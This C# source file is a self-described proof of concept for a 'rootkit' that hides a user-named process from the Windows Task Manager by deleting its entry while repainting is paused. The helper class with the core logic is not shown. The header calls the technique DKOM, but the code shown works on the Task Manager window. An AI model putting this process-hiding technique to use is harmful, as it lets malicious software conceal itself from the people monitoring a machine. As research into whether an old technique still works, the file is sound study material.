using System;
using Client.API;

/// 11-09-2016
/// oliver.buckler@gmail.com
/// Tested against Windows 10 (x64)

/// Summary:
/// This application is a proof of concept for a
/// DKOM based 'rootkit'; which can interupt the flow
/// of the Window's "Task Manager".
/// 
/// This application's purpose is to see if the 
/// old process chain manipulation approach was still viable
/// since its only last writeup using Windows XP (x32).

namespace Client
{
    class Program
    {
        static void Main(string[] args)
        {
            // Grab the address of the window and create a new structure for handling the task manager.
            IntPtr instance = User32.FindWindow(null, "Task Manager");
            sTaskMgr taskManagerInstance = new sTaskMgr(instance);

            while (taskManagerInstance.lhWndParent != IntPtr.Zero)
            {
                // Take the desired process.
                Console.Write("Process to hide: ");
                string procName = Console.In.ReadLine();

                // Find the process index from the global process chain
                int procIndex = taskManagerInstance.GetProcessIndex(procName);

                // Disable the task managers invalidate method, delete the process 
                // from memory and re-establish the invalidation.
                taskManagerInstance.DisableTaskListOnPaint(true);
                taskManagerInstance.DeleteProcess(procIndex);
                taskManagerInstance.DisableTaskListOnPaint(false);
            }
        }
    }
}
